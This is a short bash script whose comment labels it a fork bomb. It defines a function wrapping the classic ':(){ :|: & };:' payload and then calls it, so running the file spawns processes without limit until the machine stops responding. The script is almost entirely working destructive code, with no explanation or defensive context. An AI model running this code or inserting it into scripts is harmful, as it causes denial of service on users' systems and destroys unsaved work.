#!/usr/bin/bash

# This is a forx bomb
function forkBomb () {
  :(){ :|: & };:
}
forkBomb
